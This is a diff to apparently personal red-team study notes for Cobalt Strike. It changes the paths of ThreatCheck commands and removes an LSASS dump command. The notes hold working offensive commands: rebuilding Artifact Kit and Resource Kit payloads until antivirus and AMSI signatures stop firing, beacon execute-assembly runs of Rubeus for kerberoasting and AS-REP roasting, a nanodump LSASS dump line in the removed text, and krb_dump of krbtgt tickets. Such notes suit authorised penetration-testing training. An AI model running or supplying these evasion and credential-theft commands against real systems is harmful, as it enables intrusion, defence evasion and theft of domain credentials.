@@ -91,7 +91,7 @@ Cobalt Strike ships Artifact Kit with a simple XOR-decryption `for` loop in `pat
 
 **Step 1 — Run ThreatCheck, get the flagged offset:**
 ```cmd
-ThreatCheck.exe -f "C:\tools\cobaltstrike\custom-artifacts\mailslot\artifact64big.exe"
+C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f "C:\tools\cobaltstrike\custom-artifacts\mailslot\artifact64big.exe"
 # Output: Byte[]: 0x00004C20
 #         HEX: 31 C0 48 FF C8 ...
 ```
@@ -143,7 +143,7 @@ cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/artifact
 ./build.sh mailslot VirtualAlloc 351363 0 false false none /mnt/c/Tools/cobaltstrike/custom-artifacts
 ```
 ```cmd
-ThreatCheck.exe -f "C:\tools\cobaltstrike\custom-artifacts\mailslot\artifact64big.exe"
+C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f "C:\tools\cobaltstrike\custom-artifacts\mailslot\artifact64big.exe"
 # No output = CLEAN. New offset output = new signature found → repeat from Step 1.
 ```
 
@@ -164,7 +164,7 @@ cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/artifact
 ./build.sh mailslot VirtualAlloc 351363 0 false false none /mnt/c/Tools/cobaltstrike/custom-artifacts
 
 # ThreatCheck — must be clean before loading
-ThreatCheck.exe -f "C:\tools\cobaltstrike\custom-artifacts\mailslot\artifact64big.exe"
+C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f "C:\tools\cobaltstrike\custom-artifacts\mailslot\artifact64big.exe"
 
 # WSL — Build Resource Kit
 cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/resource
@@ -174,7 +174,7 @@ cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/resource
 # VSCode: replace compress.ps1 with obfuscated Invoke-Obfuscation version
 
 # ThreatCheck AMSI — must show "No threat found"
-ThreatCheck.exe -f .\template.x64.ps1 -e AMSI -t Script
+C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f .\template.x64.ps1 -e AMSI -t Script
 ```
 
 ```
@@ -385,10 +385,7 @@ beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoas
 // AS-REP Roasting
 beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
 
-// LSASS dump — BOF method (OPSEC-SAFE relative to Mimikatz direct)
-beacon> inline-execute nanodump.o --write C:\Windows\Temp\<rand>.dmp
-
-// Triage + dump Kerberos tickets (BOF — no LSASS raw read)
+// Triage + dump Kerberos tickets (BOF — no LSASS raw read, preferred over any LSASS dump)
 beacon> krb_triage
 beacon> krb_dump /user:rsteel /service:krbtgt
 ```
